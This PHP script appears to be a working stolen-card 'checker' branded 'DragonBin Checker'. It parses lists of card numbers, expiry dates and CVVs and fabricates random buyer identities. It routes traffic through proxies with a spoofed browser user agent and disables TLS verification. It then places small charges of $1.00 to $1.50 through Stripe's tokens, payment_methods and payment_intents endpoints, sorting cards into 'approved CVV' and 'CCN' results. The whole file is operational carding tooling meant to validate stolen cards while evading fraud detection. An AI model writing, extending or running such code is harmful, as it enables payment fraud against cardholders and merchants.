<?php
// Error handling and setup
error_reporting(0);
set_time_limit(0);
date_default_timezone_set('America/New_York');

// Include required files
require_once 'functions.php';
require_once 'proxy_handler.php';
require_once 'results_formatter.php';

// Get card details from the request
$lista = $_GET['lista'];
$cc_parts = multiexplode(array(":", "|", " "), $lista);

// Extract card details
$cc = isset($cc_parts[0]) ? trim($cc_parts[0]) : '';
$mes = isset($cc_parts[1]) ? trim($cc_parts[1]) : '';
$ano = isset($cc_parts[2]) ? trim($cc_parts[2]) : '';
$cvv = isset($cc_parts[3]) ? trim($cc_parts[3]) : '';

// Check for PI mode
$checkType = isset($_GET['type']) ? $_GET['type'] : 'standard';
$pk = isset($_GET['pk']) ? $_GET['pk'] : '';
$secretpi = isset($_GET['secretpi']) ? $_GET['secretpi'] : '';

// Validate input
if (empty($cc) || empty($mes) || empty($ano) || empty($cvv)) {
    echo formatDeclinedResponse($lista, "Card information incomplete", "INVALID_FORMAT");
    exit;
}

// Validate card number format
if (!preg_match('/^[0-9]{13,19}$/', $cc)) {
    echo formatDeclinedResponse($lista, "Invalid card number format", "INVALID_CARD_NUMBER");
    exit;
}

// Validate month format
if (!preg_match('/^(0?[1-9]|1[0-2])$/', $mes)) {
    echo formatDeclinedResponse($lista, "Invalid month format", "INVALID_MONTH");
    exit;
}

// Validate year format
if (!preg_match('/^[0-9]{2}$|^[0-9]{4}$/', $ano)) {
    echo formatDeclinedResponse($lista, "Invalid year format", "INVALID_YEAR");
    exit;
}

// Convert year format if needed
if (strlen($ano) == 2) {
    $ano = '20' . $ano;
}

// Validate CVV format
if (!preg_match('/^[0-9]{3,4}$/', $cvv)) {
    echo formatDeclinedResponse($lista, "Invalid CVV format", "INVALID_CVV");
    exit;
}

// Check card expiry date
$current_year = (int)date('Y');
$current_month = (int)date('m');

if ((int)$ano < $current_year || ((int)$ano == $current_year && (int)$mes < $current_month)) {
    echo formatDeclinedResponse($lista, "Card expired", "EXPIRED_CARD");
    exit;
}

// Generate unique identifiers
$guid = AllinOne();
$muid = AllinOne();
$sid = AllinOne();

// Get BIN information
try {
    $bin_info = getBinInfo($cc);
    $bindata1 = $bin_info['bindata'];
    $brand = $bin_info['brand'];
    $country = $bin_info['country'];
    $type = $bin_info['type'];
    $bank = $bin_info['bank'];
    $emoji = $bin_info['emoji'];
    $bin = substr($cc, 0, 6);
} catch (Exception $e) {
    // If BIN lookup fails, continue with limited information
    $bindata1 = "Unknown";
    $brand = "Unknown";
    $country = "Unknown";
    $type = "Unknown";
    $bank = "Unknown";
    $emoji = "";
    $bin = substr($cc, 0, 6);
}

// Generate random user information
$user_info = generateRandomUserInfo();
$first = $user_info['first'];
$last = $user_info['last'];
$email = $user_info['email'];
$street = $user_info['street'];
$city = $user_info['city'];
$state = $user_info['state'];
$phone = $user_info['phone'];
$postcode = $user_info['postcode'];
$zip = $user_info['zip'];

// Set up proxy
try {
    $proxy_data = getProxyData();
    $proxy = $proxy_data['proxy'];
    $credentials = $proxy_data['credentials'];
    $useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36";
} catch (Exception $e) {
    echo formatDeclinedResponse($lista, "Proxy setup failed: " . $e->getMessage(), "PROXY_ERROR");
    exit;
}

// Check if using PI verification mode
if ($checkType === 'pi' && !empty($pk) && !empty($secretpi)) {
    // Execute Python script for PI verification
    $command = escapeshellcmd("python3 stripe_verify.py " . 
                escapeshellarg($cc) . " " . 
                escapeshellarg($mes) . " " . 
                escapeshellarg($ano) . " " . 
                escapeshellarg($cvv) . " " . 
                escapeshellarg($pk) . " " . 
                escapeshellarg($secretpi) . " " .
                escapeshellarg($proxy) . " " .
                escapeshellarg($credentials));
    
    $output = shell_exec($command);
    
    // Process Python script output
    if (strpos($output, "Payment successful") !== false) {
        echo formatApprovedCVVResponse($lista, $bin_info, $user_info, "PI CHECKOUT SUCCESSFUL", $output);
    } else if (strpos($output, "3DS CARD") !== false) {
        echo formatApprovedCCNResponse($lista, $bin_info, $user_info, "3DS REQUIRED", $output);
    } else {
        // Extract error details if available
        $error_code = "UNKNOWN";
        $decline_code = "UNKNOWN";
        $message = "Unknown Error";
        
        if (preg_match('/𝐒𝐭𝐚𝐭𝐮𝐬 -» (.*?) \|/', $output, $matches)) {
            $error_code = $matches[1];
        }
        
        if (preg_match('/\| (.*?) \|/', $output, $matches)) {
            $decline_code = $matches[1];
        }
        
        if (preg_match('/\| (.*?)\n/', $output, $matches)) {
            $message = $matches[1];
        }
        
        echo formatDeclinedResponse($lista, $message, $error_code . " | " . $decline_code, $bin_info, $user_info);
    }
    
    exit;
}

// Start timer for performance measurement
$time_start = microtime(true);

// First request - Initialize
try {
    $ch = curl_init();
    setupCurlWithProxy($ch, $proxy, $credentials, $useragent);
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Accept: application/json',
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://js.stripe.com',
        'Referer: https://js.stripe.com/',
        'User-Agent: ' . $useragent
    ));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&guid='.$guid.'&muid='.$muid.'&sid='.$sid);
    
    $r1 = curl_exec($ch);
    $error = curl_error($ch);
    
    if (!empty($error)) {
        throw new Exception("cURL Error: " . $error);
    }
    
    // Parse token from response
    $token1 = GetStr($r1, '"id": "', '"');
    
    if (empty($token1) || strpos($r1, '"id": "tok_') === false) {
        // If no token, parse error message
        $error_message = GetStr($r1, '"message": "', '"');
        $decline_code = GetStr($r1, '"code": "', '"');
        
        if (empty($error_message)) {
            $error_message = "Token generation failed";
        }
        
        if (empty($decline_code)) {
            $decline_code = "UNKNOWN_ERROR";
        }
        
        echo formatDeclinedResponse($lista, $error_message, $decline_code, $bin_info, $user_info);
        exit;
    }
} catch (Exception $e) {
    echo formatDeclinedResponse($lista, "Connection error: " . $e->getMessage(), "CONNECTION_ERROR", $bin_info, $user_info);
    exit;
}

// Second request - Card verification
try {
    $ch = curl_init();
    setupCurlWithProxy($ch, $proxy, $credentials, $useragent);
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Accept: application/json',
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://js.stripe.com',
        'Referer: https://js.stripe.com/',
        'User-Agent: ' . $useragent
    ));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[token]='.$token1);
    
    $r2 = curl_exec($ch);
    $error = curl_error($ch);
    
    if (!empty($error)) {
        throw new Exception("cURL Error: " . $error);
    }
    
    // Parse payment method ID
    $token2 = GetStr($r2, '"id": "', '"');
    
    if (empty($token2) || strpos($r2, '"id": "pm_') === false) {
        // If no payment method ID, parse error message
        $error_message = GetStr($r2, '"message": "', '"');
        $decline_code = GetStr($r2, '"code": "', '"');
        
        if (empty($error_message)) {
            $error_message = "Payment method creation failed";
        }
        
        if (empty($decline_code)) {
            $decline_code = "UNKNOWN_ERROR";
        }
        
        echo formatDeclinedResponse($lista, $error_message, $decline_code, $bin_info, $user_info);
        exit;
    }
} catch (Exception $e) {
    echo formatDeclinedResponse($lista, "Connection error: " . $e->getMessage(), "CONNECTION_ERROR", $bin_info, $user_info);
    exit;
}

// Third request - Authorization attempt with $1 charge
try {
    $amount = rand(100, 150); // $1.00 to $1.50
    
    $ch = curl_init();
    setupCurlWithProxy($ch, $proxy, $credentials, $useragent);
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Accept: application/json',
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://js.stripe.com',
        'Referer: https://js.stripe.com/',
        'User-Agent: ' . $useragent
    ));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$amount.'&currency=usd&payment_method_types[]=card&description=DragonBin Checker&payment_method='.$token2.'&confirm=true&off_session=true');
    
    $r3 = curl_exec($ch);
    $error = curl_error($ch);
    
    if (!empty($error)) {
        throw new Exception("cURL Error: " . $error);
    }
    
    // Calculate execution time
    $time_end = microtime(true);
    $execution_time = round($time_end - $time_start, 2);
    
    // Process response
    if (strpos($r3, '"status": "succeeded"') !== false) {
        // Payment succeeded - CVV match
        echo formatApprovedCVVResponse($lista, $bin_info, $user_info, "Approved", "Transaction approved - $" . number_format($amount/100, 2) . " charged", $execution_time);
    } else if (strpos($r3, '"status": "requires_action"') !== false || 
              strpos($r3, '"status": "requires_source_action"') !== false ||
              strpos($r3, 'three_d_secure_redirect') !== false ||
              strpos($r3, 'requires_confirmation') !== false) {
        // 3D Secure required - CCN match
        echo formatApprovedCCNResponse($lista, $bin_info, $user_info, "3D Secure Required", "Card enrolled in 3D Secure - Possible CCN match", $execution_time);
    } else {
        // Declined - Parse error message
        $error_message = GetStr($r3, '"message": "', '"');
        $decline_code = GetStr($r3, '"decline_code": "', '"');
        $error_code = GetStr($r3, '"code": "', '"');
        
        if (empty($error_message)) {
            $error_message = "Unknown error";
        }
        
        if (empty($decline_code) && empty($error_code)) {
            $decline_code = "UNKNOWN_ERROR";
        } else if (empty($decline_code)) {
            $decline_code = $error_code;
        }
        
        echo formatDeclinedResponse($lista, $error_message, $decline_code, $bin_info, $user_info, $execution_time);
    }
} catch (Exception $e) {
    echo formatDeclinedResponse($lista, "Connection error: " . $e->getMessage(), "CONNECTION_ERROR", $bin_info, $user_info);
}

curl_close($ch);
?>
